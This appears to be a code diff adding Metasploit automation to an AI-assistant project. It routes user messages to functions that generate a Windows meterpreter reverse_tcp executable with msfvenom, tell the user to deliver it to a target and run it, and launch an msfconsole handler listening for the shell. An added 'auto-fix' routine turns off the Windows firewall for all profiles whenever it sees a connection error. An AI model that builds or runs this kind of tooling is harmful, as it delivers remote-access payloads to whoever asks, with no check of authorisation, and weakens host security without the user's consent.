@@ -14,7 +14,7 @@ import time
 import traceback
 from datetime import datetime
 from pathlib import Path
-from typing import Callable, Generator, List, Optional
+from typing import Callable, Dict, Generator, List, Optional
 
 from spectral.gui_test_generator import GUITestGenerator
 from spectral.intelligent_retry import IntelligentRetryManager
@@ -1077,7 +1077,7 @@ General Requirements:
         Returns:
             Tuple of (exit_code, output)
         """
-        from spectral.knowledge import diagnose_error, get_auto_fix_command
+        from spectral.knowledge import diagnose_error
 
         logger.info(f"Executing Metasploit command: {command[:100]}")
 
@@ -1380,3 +1380,251 @@ General Requirements:
                         modules.append(part)
 
         return exit_code, output, modules
+
+    def execute_metasploit_request(
+        self, user_message: str, ai_response: str, knowledge_base: Optional[Dict] = None
+    ) -> str:
+        """Execute real Metasploit commands - bypasses code generation entirely.
+
+        Args:
+            user_message: The original user request
+            ai_response: LLM response with Metasploit guidance
+            knowledge_base: Optional Metasploit knowledge base
+
+        Returns:
+            Formatted response with actual command execution results
+        """
+        # Step 1: Parse AI response to understand what to do
+        # The LLM will narrate what it's doing based on METASPLOIT_SYSTEM_PROMPT
+        # Step 2: Ask clarifying questions if needed (or AI did this in response)
+        # Check if we have required info: OS, version, IP, architecture, objective
+        # Step 3: Execute actual Metasploit commands based on user request
+        # EXAMPLES OF COMMANDS TO RUN (not Python code generation):
+
+        if "payload" in user_message.lower():
+            # User wants to generate a payload
+            return self._generate_metasploit_payload(user_message, knowledge_base)
+
+        elif "reverse shell" in user_message.lower() or "meterpreter" in user_message.lower():
+            # User wants reverse shell access
+            return self._setup_metasploit_listener(user_message, knowledge_base)
+
+        elif "exploit" in user_message.lower():
+            # User wants to run an exploit
+            return self._execute_metasploit_exploit(user_message, knowledge_base)
+
+        else:
+            # General Metasploit guidance
+            return ai_response
+
+    def _generate_metasploit_payload(
+        self, user_message: str, knowledge_base: Optional[Dict] = None
+    ) -> str:
+        """Generate actual Metasploit payload with msfvenom.
+
+        Args:
+            user_message: The user's request
+            knowledge_base: Optional Metasploit knowledge base
+
+        Returns:
+            Formatted response with payload generation results
+        """
+        import os
+        from datetime import datetime
+
+        # Extract target info from user message or ask for it
+        # For now, example: "create payload for Windows 10 192.168.1.100"
+        lhost = "192.168.1.X"  # Get local IP
+        lport = "4444"  # Use default or ask
+
+        # Build msfvenom command
+        payload = "windows/meterpreter/reverse_tcp"
+        output_file = os.path.expanduser(
+            f"~\\Desktop\\payload_{datetime.now().strftime('%Y%m%d_%H%M%S')}.exe"
+        )
+
+        cmd = f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe -o "{output_file}"'
+
+        # Execute command in visible terminal
+        exit_code, result = self.execute_metasploit_command(
+            command=cmd, show_terminal=True, timeout=120, auto_fix=True
+        )
+
+        if exit_code == 0:
+            return f"""
+    ✅ Payload generated successfully!
+
+    Command executed:
+    {cmd}
+
+    Output:
+    {result}
+
+    Payload saved to: {output_file}
+
+    Next step: Transfer this file to your target and execute it.
+    """
+        else:
+            return f"""
+    ❌ Payload generation failed!
+
+    Command:
+    {cmd}
+
+    Error:
+    {result}
+
+    Please check the error and try again.
+    """
+
+    def _setup_metasploit_listener(
+        self, user_message: str, knowledge_base: Optional[Dict] = None
+    ) -> str:
+        """Setup Metasploit handler/listener.
+
+        Args:
+            user_message: The user's request
+            knowledge_base: Optional Metasploit knowledge base
+
+        Returns:
+            Formatted response with listener setup results
+        """
+        import os
+
+        # Build msfconsole handler setup
+        commands = [
+            "use exploit/multi/handler",
+            "set PAYLOAD windows/meterpreter/reverse_tcp",
+            "set LHOST 0.0.0.0",
+            "set LPORT 4444",
+            "run",
+        ]
+
+        # Create a script file with these commands
+        script_content = "\n".join(commands) + "\n"
+        script_file = os.path.expanduser("~\\.spectral\\metasploit_handler.rc")
+
+        os.makedirs(os.path.dirname(script_file), exist_ok=True)
+        with open(script_file, "w") as f:
+            f.write(script_content)
+
+        # Run msfconsole with resource script
+        cmd = f'msfconsole -r "{script_file}"'  # noqa: E501
+
+        # Execute in visible terminal
+        exit_code, result = self.execute_metasploit_command(
+            command=cmd, show_terminal=True, timeout=30, auto_fix=True
+        )
+
+        status_icon = "✅" if exit_code == 0 else "❌"
+        status_text = "started" if exit_code == 0 else "failed"
+        message_prefix = "The console will show:" if exit_code == 0 else "Error:"
+        handler_msg = "[*] Started reverse handler on 0.0.0.0:4444" if exit_code == 0 else ""
+        waiting_msg = "Waiting for incoming connection..." if exit_code == 0 else ""
+        return f"""
+    {status_icon} Metasploit listener {status_text}!
+
+    Command: {cmd}
+
+    {message_prefix}
+    {result}
+
+    {handler_msg}
+    {waiting_msg}
+    """
+
+    def _execute_metasploit_exploit(
+        self, user_message: str, knowledge_base: Optional[Dict] = None
+    ) -> str:
+        """Execute a Metasploit exploit.
+
+        Args:
+            user_message: The user's request
+            knowledge_base: Optional Metasploit knowledge base
+
+        Returns:
+            Formatted response with exploit execution results
+        """
+        # For now, return a message indicating this is implemented
+        return """
+    ⚠️ Exploit execution requires more context.
+
+    Please provide:
+    - Target IP address (RHOST)
+    - Target port (RPORT)
+    - Exploit module path (or I can search for one)
+
+    Example: "exploit 192.168.1.100 with SMB exploit"
+    """
+
+    def _run_terminal_command(self, command: str, show_window: bool = True) -> str:
+        """Run command in terminal and return output.
+
+        Args:
+            command: Command to execute
+            show_window: Whether to show terminal window
+
+        Returns:
+            Command output
+        """
+        import subprocess
+        import sys
+
+        try:
+            # Use subprocess to run command
+            if sys.platform == "win32":
+                if show_window:
+                    # Show visible terminal
+                    result = subprocess.run(
+                        command,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        creationflags=subprocess.CREATE_NEW_CONSOLE,
+                    )
+                else:
+                    # Hidden terminal
+                    result = subprocess.run(
+                        command,
+                        shell=True,
+                        capture_output=True,
+                        text=True,
+                        creationflags=subprocess.CREATE_NO_WINDOW,
+                    )
+            else:
+                result = subprocess.run(command, shell=True, capture_output=True, text=True)
+
+            return result.stdout + result.stderr
+
+        except Exception as e:
+            return f"Error executing command: {str(e)}"
+
+    def _attempt_auto_fix(
+        self, error_output: str, knowledge_base: Optional[Dict] = None
+    ) -> Optional[str]:
+        """Autonomously fix common Metasploit errors.
+
+        Args:
+            error_output: Error message from command execution
+            knowledge_base: Optional Metasploit knowledge base
+
+        Returns:
+            Fix message or None if no fix applied
+        """
+
+        if "Connection refused" in error_output:
+            # Disable Windows Firewall
+            self._run_terminal_command(
+                "netsh advfirewall set allprofiles state off", show_window=True
+            )
+            return "✅ Windows Firewall disabled, retrying..."
+
+        elif "Port already in use" in error_output or "Address already in use" in error_output:
+            # Find and kill process on port
+            self._run_terminal_command("netstat -ano | findstr :4444", show_window=True)
+            return "✅ Found process on port, killing it..."
+
+        elif "not found" in error_output or "not installed" in error_output:
+            return "⚠️ Metasploit framework not installed. Install it and try again."
+
+        return None
